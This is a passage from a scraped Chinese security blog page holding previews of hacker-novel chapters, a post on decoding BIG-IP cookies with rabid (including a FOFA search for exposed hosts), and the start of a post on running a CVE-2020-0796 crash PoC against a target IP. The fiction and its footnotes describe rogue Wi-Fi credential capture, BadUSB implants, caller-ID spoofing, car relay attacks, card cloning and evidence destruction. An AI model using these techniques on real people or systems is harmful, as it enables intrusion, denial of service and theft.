&lt;p&gt;王梓家中来了警察，他们在门口按了几下门铃，等了一会，见没人应。便强制进入到王梓家中。进门的那一刻，一名警察似乎脚下被门口的什么东西拌了一下，接着传来清脆的风铃声。这时王梓的电脑主机开始运转速度加快，声音也随之变大。电脑中加密的内容开始被擦除。此时的王梓通过控制树莓派观看家里的影响和声音，他拍下了几个人的照片，然后按下了自毁按键。王梓家中电脑桌上的微波炉开始工作，警察们还在检查着屋子，就在即将来到电脑来来进行取证的时候。电脑桌上的微波炉爆炸了，还有火花，紧接着又爆炸一次。因为电脑就在微波炉旁边，电脑已经停止运转，而受爆炸影响，电脑的主板，硬盘等都已经损坏。而王梓家里的电也因为爆炸而跳闸。房间里静下来，爆炸的位置冒着烟。现在警察已经无法取证。只能继续排查房间，他们不知道的是，在检查房间的时候，一个警察的手机已经自动连接上了王梓伪造的wiki上。这个是通过在树莓派上搭建的FruityWifi（注解1）实现。王梓获取了这名警察的qq号码，和一个账号密码。并迅速擦除了树莓派上所有的记录。&lt;/p&gt;
&lt;p&gt;警察没有其他收获，最终仅仅带走了那个网络摄像头和已经损坏的电脑。&lt;/p&gt;
&lt;p&gt;王梓要冒险继续深入调查买家。他要了解清楚这一整件事。双方都在寻找王梓，但是一时间，王梓就如同人间蒸发，没有了踪迹。消息在网络中，隐藏在这现实世界中。&lt;/p&gt;
&lt;h2 id=&#34;注解&#34;&gt;注解&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;注解1: FruityWIfi是一款无线安全审计的开源工具，其灵感来自于Wifi Pineapple。开源地址：https://github.com/xtr4nge/FruityWifi 感兴趣的，可以搜索Wifi Pineapple和FruityWIfi去学习。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
">原创小说《杀手》第十章 逃</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/bigip-cookie-decode-get-real-ip/"" data-c="
          &lt;p&gt;BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer&lt;sub&gt;FinanceAndAdminWeb&lt;/sub&gt;fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。&lt;/p&gt;
&lt;p&gt;最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语言编写，支持4种cookie格式。github地址：&lt;a href=&#34;https://github.com/Orange-Cyberdefense/rabid&#34;&gt;https://github.com/Orange-Cyberdefense/rabid&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;工具使用&#34;&gt;工具使用&lt;/h2&gt;
&lt;p&gt;工具使用ruby编写，需要ruby 2.4以上版本的环境。首先要保证安装好ruby。然后使用gem安装包&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gem install rabid&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装完成后，可以使用ruby包含该库，也可以直接运行命令执行。&lt;/p&gt;
&lt;p&gt;命令示例如下：&lt;br&gt;
&lt;code&gt;rabid &#39;BIGipServer~FinanceAndAdminWeb~fo.unc.edu=105389996.20480.0000&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;上面的参数就是set-cookie的值。&lt;/p&gt;
&lt;p&gt;运行结果(运行环境macos，ruby 2.6.3)：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584775312957.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在自己的代码中使用该库,代码示例如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require &#39;bigipcookie&#39;

# IPv4 pool members, with pool name
bip = BigIPCookie::Decode.new(&#39;BIGipServer&amp;lt;pool_name&amp;gt;=1677787402.36895.0000&#39;)
# Automatically decode
bip.auto_decode
# Print result
puts &amp;quot;Cookie: #{bip.decoded_cookie}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外也可以使用git安装。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/Orange-Cyberdefense/rabid.git rabid
cd rabid
gem install bundler
bundler install
gem build bigipcookie.gemspec
gem install rabid-x.x.x.gem
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;具体帮助文档可见：https://orange-cyberdefense.github.io/rabid/&lt;/p&gt;
&lt;h2 id=&#34;测试&#34;&gt;测试&lt;/h2&gt;
&lt;p&gt;使用fofa可搜索到上万个例子，搜索语法：&lt;code&gt;header=&amp;quot;BIGipServer&amp;quot;&lt;/code&gt;。链接地址：&lt;a href=&#34;https://fofa.so/result?qbase64=aGVhZGVyPSJCSUdpcFNlcnZlciI%3D&#34;&gt;https://fofa.so/result?qbase64=aGVhZGVyPSJCSUdpcFNlcnZlciI%3D&lt;/a&gt;&lt;/p&gt;
">BigIP Cookie 解码获取真实IP</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Nine/"" data-c="
          &lt;p&gt;##芭堤雅&lt;/p&gt;
&lt;p&gt;下午两点，一架直升机停在4000米的高空中，王梓手握着飞机舱门上的把手，耳边是螺旋桨旋转发出的轰隆声，身体下方的是距离4000米高的海岸。背后的老外对他喊的话，他已经听不清楚。撒开手，他与身后的老外一起跳下飞机。突然间，王梓大脑一片空白，心感觉也要从嗓子眼中蹦出去，但很快他感觉到的是身体极速下坠的失重感。王梓闭上了眼睛，脑海中浮现出他拿到的那份资料，文件里一个个名字，以及记录的时间和地点，让他产生了恐惧，这次他犹豫了，不知道是否要继续下去。过了几秒，他身后的老外打开了什么东西，双腿突然向被甩出去一样，降落的速度慢了一些。但是，下降的速度还是会形成很大的气流，吹的他脸部、胳膊都变形了。他睁开了眼睛，阳光照射下的海洋、沙滩、树木、草地尽收眼底。王梓想：“这就是上帝视角吧”。这种居高临下的感觉，是前所未有的，那种强者才有的孤独感更加的强烈。&lt;/p&gt;
&lt;p&gt;男人的天堂——芭堤雅。夜晚降临，这座城市才真正的迎来高潮。你所看到大街上的美女不一定是个女人。倘若你走上路上，坐在按摩店门口的泰国中年女子拉着你的手叫你老公或者老板。也会看到欧美中年肥胖男子手里搂着他们买来的泰国老婆。当然，街上的中国人也不少。近些年来大陆来东南亚的游客越拉越多。王梓坐在酒吧的一个角落里，独自一人喝着酒。他还在犹豫。桌上的酒已经喝的差不多了，他看着手中的酒杯。然后猛地的一口将杯中酒全部喝完。轻轻的放下酒杯，起身走出酒吧，他已经做出了决定了。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;北京&#34;&gt;北京&lt;/h2&gt;
&lt;p&gt;killer47 ：“目标已经搞定，可以开始交易了。”&lt;br&gt;
Boss ： “不愧是killer47先生，比规定时间早了一个月就搞定了。我们当面交易如何？”&lt;br&gt;
killer47 ：“这是不可能的。不要试图调查我。你不会有任何结果。”&lt;br&gt;
Boss ： “别误会，这资料非常重要，我们需要当面确认，防止你逃跑。”&lt;br&gt;
killer47 ： “我怎么可以信任你们？”&lt;br&gt;
Boss : “交易地点和时间可以你来选，同时我们可以先把一半的佣金先付给你。如何？”&lt;br&gt;
killer47 ：“你们等我消息吧。”&lt;br&gt;
Boos ： “静候佳音”。&lt;br&gt;
这次王梓已经决定冒险。他将获取到的重要的音频，图片和excel文档使用truecrypt进行加密，接着又将加密的内容文件通过隐写（备注1）软件隐藏在不同的图片中。然后拷贝到一个usb中。这些文件存储着HH集团老板与某些官员的犯罪证据，以及账目信息。有照片，有录音，还有通讯录。这原本存放在HH集团老板的私人电脑中。王梓冒着极大的风险获取到了它，但是此时事情应该已经暴露。前不久，他的朋友石磊突然联系他，并询问他为什么要去偷盗，同时已经有经常开始介入了，并劝他尽快自守。对于这一切，王梓现在还不能跟他的好友说明这一切，他不得不告诉他的好友后面解释。并挂断了电话。&lt;/p&gt;
&lt;p&gt;这还要从王梓在IT部门的人员获取权限后说起，他寻找到秘书所使用的电脑。了解到了HH集团老板的部分行程。王梓开车提前到地点守在门口并进行跟踪。这个过程非常需要耐心，需要守株待兔，盯着目标人物。王梓跟到了HH集团老板的住处，并对其周围进行观察，是在顺义区的一个别墅区。别墅区管理严格，王梓无法直接跟进去。王梓观察了下别墅以及周边的情况。接下来又是漫长又无聊的等待，等待着目标人物再次出现。期间一直没有机会去进一步接触，直到晚上HH集团去约人吃饭。在吃完饭后，HH集团老板开车的一瞬间，王梓在不远处进行中继攻击，最终王梓可以解锁HH老板的车（备注2）。王梓又继续等待时机，趁机使用Nexus手机（备注3）复制其放在车内的小区门禁卡。通过王梓的几天来的蹲点，进入到HH集团老板的家中，并将其私人电脑中的硬盘克隆出一份。这还不是最后一步，他将网线接入自己的电脑中。开始探测这栋房子里的摄像头，他要删掉摄像头的关于他的影像。出回到家中，王梓仔细分析其内容，终于找到了需要的文件。当他看到文件的那一刻，不禁吃了一惊。这是他惹不起的，这也就是他一直犹豫的原因。而事情已经做了，暴露只是时间问题。王梓的行为已经被小区监控记录下。小区的监控短时间发现并将他的记录删除这并不容易。&lt;/p&gt;
&lt;p&gt;王梓要尽快的拿到钱，并尽快离开这里。想想就要离开小楠，王梓有些不舍，但是他不得不离开，迈出了这一步，他已经没有了选择。&lt;/p&gt;
&lt;p&gt;##注解&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;数据隐写：一种将信息隐藏在正常文件（如jpg、bmp、gif、mp3、pdf等）中的技术。工具有很多，如LSB-Steganography，mp3stego、stegomagic等。也可以利用ntfs文件格式的ads流来实现。一些ctf比赛中的misc会有。感兴趣的可以进一步了解一下。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;黑客可以克隆丰田、现代等汽车：原文：https://www.wired.com/story/hackers-can-clone-millions-of-toyota-hyundai-kia-keys/ 。这里提到的中继攻击是去年破解特斯拉使用的攻击方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Google Nexus 6：刷kali nethunter后，可以对其读写rfid卡。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">原创小说《杀手》第九章 王者归来</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Eight/"" data-c="
          &lt;pre&gt;&lt;code&gt;这是一个最好的时代，这是一个最坏的时代；

这是一个智慧的年代，这是一个愚蠢的年代；

这是一个光明的季节，这是一个黑暗的季节；

这是希望之春，这是失望之冬；

人们面前应有尽有，人们面前一无所有；

人们正踏上天堂之路，人们正走向地狱之门。

　　                        ——《双城记》狄更斯 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;入侵的路从来就不是平坦的，这取决实施入侵的人。黑客通常会找到别人看不到的路通往最终的目标。而这次是一个庞大的集团，尽管入口可能很多，但是许多条路都纷繁复杂，有些甚至可能是甜蜜的陷阱，又或者是达不到最终的终点。&lt;/p&gt;
&lt;p&gt;面对如此庞大的集团，除了自动化的信息收集系统，需要大量的人为的将这些信息进行提取、组合，制定入侵的方案。从而用最短的事件达到目标。盲目的去乱碰无异于浪费时间与生命。&lt;/p&gt;
&lt;p&gt;是否是因为最近几个月拒绝了任务让自己做出如此不合常规的操作？王梓内心中开始嘲笑起自己之前的愚蠢做法。这种情况对于一名职业网络杀手来说是一个危险的信号。他不得不重视起来并将自己紧绷起来，在内心中，此次的入侵绝对不能掉以轻心。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;将此次目标输入到信息收集的系统中。王梓面前的屏幕上显示着缓慢增长的进度条，在这简单的界面的背后却有数个分布在不同地点的服务器对网络中的无数交织起来的网络发出信息刺探的比特串。这也预示着一场网络攻击即将发生。没有人知道这网络攻击背后将会带来什么？&lt;/p&gt;
&lt;p&gt;王梓在国外的社交网络中看到关于HH集团不好的传言消息，而这样的消息在国内的网站中均看不到。而就在最近国家对国外网站的封锁力度增加了。要想翻墙去看到这类消息更加的困难。这背后是一种怎样的势力在操控着，这更加令人好奇。&lt;/p&gt;
&lt;p&gt;21世纪是一个飞速发展的时代，这个时代信息发达的程度惊人，信息的容量超过之前几千年的总和，并且每年还在翻倍的增长。国家对网络安全威胁高度重视，加快并促进了网络安全事业的建设。这对于从事网络安全行业的人是一个极好的消息，而对黑色产业来说则无疑又增加了成本。但是无论怎样，黑色产业总会以你意想不到的方法巧妙的绕过。而这两者之间是高度依赖的，如果没有黑色产业的存在，那么也不会有网络安全行业。世界就是这样的矛盾存在，而矛盾存在的根本在于这是由一个矛盾主体（人）控制的世界。&lt;/p&gt;
&lt;p&gt;从音响中发出“叮叮叮”的声音，屏幕上显示着：“你的信息收集完毕！”。王梓点击开，一幅拥有众多数据信息树形结构图展现出来。这么多的信息王梓经过了一夜的时间将起提取并梳理了出来。当完成的那一刻，王梓伸了一个懒腰，看一下时间，已经是清晨六点，窗外还是漆黑的一片。“看来今天不能够去练拳了” 王梓自言自语道。&lt;/p&gt;
&lt;p&gt;王梓将主要目标锁定在集团高层以及高层的秘书，另外还有网络的运维人员，他通过搜索引擎中意外获取到一份集团内部通讯录。与王梓构建的社工库进行结合，很快便得到了相关人员的关键信息。攻击高层更加直接，如果不行，在通过运维人员那里获得到集团大多数的服务器权限，方便从内部获取资料。&lt;/p&gt;
&lt;p&gt;又通过一个上午的忙碌，最终将目标锁定在了两个人身上，一个叫白兰，25岁，HH集团董事长其中一位秘书。另外一个叫卫祺福，28岁，HH集团运维人员。通过上午的收集，王梓掌握了这两个人的习惯，基础信息，以及最近两个人的状况，当然还包括住址，而且两个人都是喜欢发自拍照的人。在现在的网络中，社交软件上充斥着大量的个人自拍照和一些带有位置的隐私信息。对于黑客来讲这样的信息至关重要，对自己的攻击将会带来极大的方便。&lt;/p&gt;
&lt;p&gt;卫祺福正在京东的网站上查看u盘的内容，因为他最近刚买不久的u盘就坏掉了，他去卖家的地方给了一个差评。而他这次挑选u盘十分的谨慎。他还在网络中的专业论坛发帖说这件事情。此时，他的电脑响了起来。他接通了电话，电话那边传来了一个人男人的声音。&lt;/p&gt;
&lt;p&gt;“您好，请问是卫先生嘛？”&lt;/p&gt;
&lt;p&gt;“我是，你是哪位？”&lt;/p&gt;
&lt;p&gt;“我是东升科技的客服人员小赵，我看到您给我们的一款产品给了差评，并说我们的质量存在严重的问题。我想跟您了解一下情况。”&lt;/p&gt;
&lt;p&gt;“你们的u盘，我买了才1个月就坏掉了，而且你们客服说维修不了。太耽误我的事了。”&lt;/p&gt;
&lt;p&gt;“对此我感到万分的抱歉，u盘属于易损物品，但是我们都是经过产品合格检查的，出现您这种概率实在是属于小概率时间。另外，坏掉跟您的使用也有关系。”&lt;/p&gt;
&lt;p&gt;“这么说你是赖我自己喽？”&lt;/p&gt;
&lt;p&gt;“不是的，您看这样行不行，我给您重新寄一块新的u盘，您把差评去掉可以不？”&lt;/p&gt;
&lt;p&gt;“我已经不再相信你们的产品了。”&lt;/p&gt;
&lt;p&gt;“我们的硬盘绝对是正品，而且是大厂的，出现您的这种情况，实在是属于意外，极小概率的事件。我们给您补偿一个新的。如果我们的u盘再出现问题，您再考虑更换其他的不是更好。”&lt;/p&gt;
&lt;p&gt;“那你们在给我发一款新的吧。” 卫祺福想了想也是，这样能省下不少的钱。&lt;/p&gt;
&lt;p&gt;“好的，我们就按照原来的地址发一个同样的新的。另外还请您配合一下，把您原来的有问题的寄回来，我们要进行检查。”&lt;/p&gt;
&lt;p&gt;“我要寄到哪里？邮费是你们出吧？”&lt;/p&gt;
&lt;p&gt;“对的，您寄到*地址，收件人小赵，电话166123692181（随便编的号码），您寄出后，我们会第一时间给您寄送新的u盘。还请您把差评去掉。谢谢！”&lt;/p&gt;
&lt;p&gt;“我收到新的u盘在给你们去掉差评。”&lt;/p&gt;
&lt;p&gt;“好的”。&lt;/p&gt;
&lt;p&gt;卫祺福将电话挂掉，他怀疑事情可能没这么简单，他又特地去查了下来电号码确认是否是官方客服。他看到来电与店铺电话一致便打消了念头。他预约了快递准备硬盘寄出去。&lt;/p&gt;
&lt;p&gt;王梓这边传来了电话挂断的声音。他微笑了一下，看来鱼儿已经上钩了。他使用了来电电话号码欺骗的软件，并伪装了客服人员获取到了这名大集团企业运维人员的信任。一扇大门即将向他敞开。&lt;/p&gt;
&lt;p&gt;第二天，王梓就收到了卫祺福寄回来的有问题的u盘。王梓将其拆开，将其芯片取出。他将准备好的badusb的芯片放入到u盘的外壳中。该芯片在插入电脑的时候会执行恶意的远程控制程序。制作完成后，王梓在中关村电脑城购买了一模一样的新u盘。&lt;/p&gt;
&lt;p&gt;王梓使用来电显示欺骗拨通了卫祺福的电话。&lt;/p&gt;
&lt;p&gt;“您好，我是东升科技的客服，您的u盘我们已经收到，我们这边已经利用技术手段对u盘进行了修复。另外，我们为了保障你的使用，我们特意准备了一个新的u盘给您。还麻烦您把差评给删除掉。”&lt;/p&gt;
&lt;p&gt;“我拿到u盘之后看看在说。”&lt;/p&gt;
&lt;p&gt;“好的，u盘今 天会为您寄出，最迟3天收到。请您注意查收。”&lt;/p&gt;
&lt;p&gt;过了两天，王梓将两个u盘分别贴上了标签，进行区分并打包好。装进了一个纸盒中，密封好，紧接着将从快递公司拿到的快递单，将对方信息全部填写好。穿上了一身红颜色的京东快递服装。戴上一顶帽子，压的较低。一切都已经准备好，开始出发。&lt;/p&gt;
&lt;p&gt;平静如往常，在到达HH集团楼下，王梓拨通了卫祈福的电话。&lt;/p&gt;
&lt;p&gt;“您好，京东快递，有您的快件到了，麻烦下楼来取下。”&lt;/p&gt;
&lt;p&gt;“好的，我这就下去。”&lt;/p&gt;
&lt;p&gt;此时的王梓与其他快递员在一起，他蹲在具有好多快递的面前，手里的电话贴在耳边。不一会儿，卫祺福就来到了王梓面前。他对王梓说：“卫祺福的快递”。王梓抬头看了他一眼，然后将u盘递给他，并要求他签收。等到卫祺福上楼后，王梓也随即离开这里。&lt;/p&gt;
&lt;p&gt;卫祺福拿到了新的u盘，并且又多了一个u盘。他心中有些开心。脸上不自觉的漏出浅浅的微笑。他回到工位，便立即尝试u盘是否好使，将u盘插入电脑，过了5秒钟，桌面右下角弹出了新硬件接入的提示窗。就在这5秒中，远程控制程序已经植入到了卫祺福的电脑中。王梓的控制端中又多出了一台肉鸡。此时的王梓正在回家的路上，路上还可以见到一些人群人拖着行李，走在这寒冷的冬季里。他们的眼神暗淡，透出些许迷茫并带着失望。王梓不知道他们将要去哪里，也不知道为什么会这样。而现在对啊来说最重要的就是回到家中。早日发现深深隐藏在这座城市甚至国家的秘密。&lt;/p&gt;
&lt;h2 id=&#34;说明&#34;&gt;说明&lt;/h2&gt;
&lt;p&gt;1. 通过搜索引擎获取通讯的案例主要来自2013年曾经如家整个集团通讯录可以通过搜索引擎搜索。通讯录泄漏了集团级集团下属企业人员及职能和联系信息。&lt;/p&gt;
&lt;p&gt;2. 社工的思路来源于范建中的《黑客社会工程学攻击》一书的案例。&lt;/p&gt;
&lt;p&gt;3. 网络中有售卖来电显示欺骗的收费软件。&lt;/p&gt;
">原创小说《杀手》第八章 时代</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Seven/"" data-c="
          &lt;p&gt;&lt;strong&gt;我们生活在一个由少数精英制定规则的世界里。他们左手握着权力，右手握着巨大的财富。他们背后拥有一个庞大的体系，权力与财富的相辅相成，控制了整个世界。我们生活在一个看似自由，实则处处受规则限制的世界。而黑客的存在的，就是寻求真正的自由来打破规则。实现突破，自由，平等，随意。&lt;/strong&gt;&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584595916360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在小区附近的公园某处角落内，有一群身穿武术服的一群人，他们动作缓慢的打着拳，旁边一台不是很大的音箱正放着《高山流水》的曲子。在着一群人中除了王梓，其他全部都是老年人。由于他刚刚开始练习，而师傅每天只教他两个动作，许多动作不会，在人群中格外的显眼，来公园里遛弯的大爷大妈腻都纷纷看向王梓，而王梓则只专心的看着大家怎么做，自己依葫芦画瓢跟着做。大爷大妈们都很喜欢这位小伙子，有些看到王梓做的不对的地方，或过来教一下。这样的天气里，每天两个小时的练习，每次练完几乎全身都湿透了，这感觉让王梓觉得十分的轻松，缓解了他的情绪和压力。而王梓也开始改掉了自己昼伏夜出的习惯，彷佛开始过上了正常人的生活。&lt;/p&gt;
&lt;p&gt;对方已经支付了订金，王梓也开始真正的忙碌起来。这在他接过的所有单子里从来没有遇到过的事情。在王梓的心中充满疑惑，好奇心使他非常想知道是什么样的文件和名单可以这么值钱。而对方又是什么人？为什么愿意花这么高的价格要这个东西呢？王梓想要尽快完成任务，他更想看到这背后隐藏着的真相。&lt;/p&gt;
&lt;p&gt;此时王梓电脑屏幕上显示的HH集团的官网，他将网站输入到自己的大数据信息汇聚系统中，随着进度条不段的前进，页面上显示的关于HH集团的ip地址和域名的信息也在不断增多。在王梓右手边的屏幕里，王梓将汇聚出的ip地址放入到47RAT的远程控制软件里去进行搜索，47RAT是王梓花了高价钱找了一位编程高手开发的一套远程控制系统。随着搜索进度完成，47RAT显示出两个ip地址。王梓点击ip，开始翻开这两个ip里的文件，他发现这仅仅是两台放着不重要业务系统的服务器，其中有一台ip地址连接到了内网。这是个一件不错的事情，王梓嘴上漏出微笑，他内心想着：“这次运气不错，看来很快就可以发现目标。“。王梓打开文件传输对话框，将一个名为EternalBlue.exe文件拖动了上去，同时又到开了一个黑色窗口。王梓快速的输入了EternalBlue.exe，白色的字符开始一行行显示着，王梓转身准备去给自己倒一杯咖啡。&lt;/p&gt;
&lt;p&gt;突然，放在沙发上的手机亮了起来，上面显示着小楠的电话号码，紧接着响起王梓多年未变的手机铃声。王梓走过去，接起电话。&lt;/p&gt;
&lt;p&gt;“嘿，傻瓜，最近忙什么呢？都不见你人。” 电话那边传来了熟悉而又亲切的声音，这声音一直都是王梓最喜欢听到的声音。&lt;/p&gt;
&lt;p&gt;“我最近在学太极拳，比较笨，所以多花了些时间练习。”&lt;/p&gt;
&lt;p&gt;“你这是步入老年人的生活节奏了啊。请问您老贵庚啦～”小楠语气里略带了些调侃。&lt;/p&gt;
&lt;p&gt;“你呢？最近怎么样？” 王梓嘿嘿一笑，然后用很温柔的语气关心起小楠。&lt;/p&gt;
&lt;p&gt;“我当然一直很好啦。我呀，是看咱们好久没联系，看看你这个傻子过的怎么样。”&lt;/p&gt;
&lt;p&gt;“我自己挺好的，现在已经都不赖床了呢。”&lt;/p&gt;
&lt;p&gt;这时的王梓已经拿着电话走到了窗前，他看到外面天空不远处有一片乌云，正在向他这边一点点的靠近。&lt;/p&gt;
&lt;p&gt;“我看现在这天气过不了多久就要下雨了，你带伞了没有呢？”&lt;/p&gt;
&lt;p&gt;小楠看了一眼自己包里的伞，然后对王梓说：”啊，我不知道今天下雨，没带伞呢。“&lt;/p&gt;
&lt;p&gt;王梓看了看时间，此时，也正是快到小楠下班的时间了。&lt;/p&gt;
&lt;p&gt;”我看你也快下班了，我这就给你去送伞。“&lt;/p&gt;
&lt;p&gt;”好，你过来吧。那先挂了，见面在说哦。”&lt;/p&gt;
&lt;p&gt;两人互相说了再见，小楠从包里掏出雨伞，对着旁边的同事说：“小梅，我看一会就要下雨了，你带伞了没？我这里有两把，你要没带，我可以借你一把。”&lt;/p&gt;
&lt;p&gt;“没带，那还真是太谢谢啦。”小梅微笑着对小楠说谢谢。&lt;/p&gt;
&lt;p&gt;王梓带着两把伞出门了。阴暗的天，带给人一种沉闷感，或许会引起许多人的感伤。&lt;/p&gt;
&lt;p&gt;天空中开始掉雨点，王梓打开一把黑色的伞。走到小楠公司附近的一个十字路口，有断断续续的雨点变成了毛毛雨，王梓撑着伞站在十字路口等着红灯，远处一家店的放着音乐：“湿答答的下雨天，一个人站在对街，彷佛在等着谁……”。王梓透过来往的车辆看到马路对面的人群中的小楠，而就在此时小楠也看到了王梓，小楠朝王梓挥挥手。王梓也举起手回应。路灯上的数字在缓慢的倒数着。小楠左右看看来往的车辆，在看看路灯。终于等到了绿灯，由于拎着包，小楠只能小步快跑，此时的小楠在王梓的眼里很是可爱，王梓也更加心疼，也跑向小楠。&lt;/p&gt;
&lt;p&gt;小楠到了王梓的伞下，对王梓说：“没想到这么快就下起了雨。”。&lt;/p&gt;
&lt;p&gt;“你怎么提前出来了，给你拿的伞。”。王梓赶忙把伞递过去。&lt;/p&gt;
&lt;p&gt;“人家工作了一天，累了哦。咱俩就用一个吧。”&lt;/p&gt;
&lt;p&gt;“听说下雨天跟火锅更配哦～咱们去吃火锅吧～”&lt;/p&gt;
&lt;p&gt;“哇，好啊～我最爱吃的火锅，好久没吃啦”。&lt;/p&gt;
&lt;p&gt;两个人转身向火锅店走去。王梓右手拿着伞，而小楠不知道什么时候挽起了王梓的胳膊。两人就这样走在雨中。还能听到那家店放着的音乐。&lt;/p&gt;
&lt;p&gt;我是你的绝对 (你是我的一切)&lt;/p&gt;
&lt;p&gt;带你通往那幸福的终点线&lt;/p&gt;
&lt;p&gt;你要的是晴天&lt;/p&gt;
&lt;p&gt;送你一把伞 (别忘这把伞)&lt;/p&gt;
&lt;p&gt;是缘份吗? 当我看着你的眼睛&lt;/p&gt;
&lt;p&gt;整个世界彷佛都触电 像烟火点亮这片黑夜&lt;/p&gt;
&lt;p&gt;静止的时间 幸福的瞬间&lt;/p&gt;
&lt;p&gt;…………&lt;/p&gt;
&lt;p&gt;歌声一点点消失在天空……&lt;/p&gt;
&lt;p&gt;外面下着雨，王梓和小楠吃着火锅，两个人聊的也很开心。而时间也过的很快，两个人吃完后，外面的雨也停了。刚刚下过雨的夜晚的，伴着微风，舒服极了，两个人在路边漫步。&lt;/p&gt;
&lt;p&gt;“如果我要不联系你，你是不是就不会主动联系我？” 小楠突然有些责备和质问的意思问王梓。&lt;/p&gt;
&lt;p&gt;王梓先是一愣，他不知道该怎么跟小楠解释，最后脱口说出：“没有啊”。&lt;/p&gt;
&lt;p&gt;而小楠微微一笑说：“没事，走吧。”&lt;/p&gt;
&lt;p&gt;而接下来两个人默契的都沉默起来，王梓低着头走着，而小楠则看看路过，看看过往的车辆。&lt;/p&gt;
&lt;p&gt;走到小楠家的楼下。小楠对王梓说：“我到家了，我上楼了，谢谢你的火锅哦～”。&lt;/p&gt;
&lt;p&gt;“不客气～那我就回去了，你早点休息。”&lt;/p&gt;
&lt;p&gt;“你也是，拜拜～”&lt;/p&gt;
&lt;p&gt;“拜拜～”&lt;/p&gt;
&lt;p&gt;在名为爱情的游戏中，女人负责勾引，男人负责进攻。有时候你认为是你自己追到的，其实不过是女人一开始也对你有意。而现实生活有趣的是，你明明知道，但是你却依然要装作什么都不知道。对于王梓与小楠，注定不可能。王梓边走边思考着，不知不觉走到了自己家小区楼门口，一对情侣正相拥在一起，恋恋不舍。由于两个人几乎把门口堵住，而且丝毫没有让地方的意思。还好王梓不胖，只好侧身进去。&lt;/p&gt;
&lt;p&gt;回到家中，显示器中显示已经扫描完成。王梓看了下结果，发现远程控制的软件中又新增加了几台的计算机。但是由于是晚上，基本都下班了，都处于离线状态。&lt;/p&gt;
&lt;p&gt;一点进展没有，王梓叹了一口气。&lt;/p&gt;
&lt;p&gt;“这样漫无目的乱打，效率实在太低。应该聚焦，应该直奔主要目标”王梓心想。&lt;/p&gt;
&lt;p&gt;而最近，随着国内的网络安全法实施，对vpn的限制和打击，某地公安部门已经发布有人因使用vpn而被捕的声明。对王梓构建的反追踪系统造成一定的影响。王梓为此对其进行了改造。而其实让王梓想不到的是，他此次的入侵行动，竟然跟这些有着不可思议的关联。而此时的王梓还不知情。面对此次的目标，在有限的条件中，王梓开始了他新的计划。&lt;/p&gt;
&lt;h2 id=&#34;注解&#34;&gt;注解&lt;/h2&gt;
&lt;p&gt;这里提出了一个想法，就是结合全网的数据配合第一时间披露的漏洞批量植入后门，自动提升权限，植入rootkit。这样即使修复了补丁，权限依然在手里掌握着。rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。&lt;/p&gt;
&lt;p&gt;另外本小说剧情是虚构的，但是以真实的黑客技术来写。对文中技术不当之处，欢迎与我交流。&lt;/p&gt;
">原创小说《杀手》第七章 X计划</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/smbghost-crash-poc/"" data-c="
          &lt;p&gt;CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584521689217.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;使用方法：&lt;/p&gt;
&lt;p&gt;安装impacket库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python setup.py install
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;直接使用pip安装的不行，所以clone最新版本的，然后安装，在Mac系统下需要sudo权限。&lt;/p&gt;
&lt;p&gt;安装成功后，下载该代码。执行如下命令：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;python gistfile1.py 目标IP&lt;/p&gt;
&lt;p&gt;运行后效果：&lt;/p&gt;
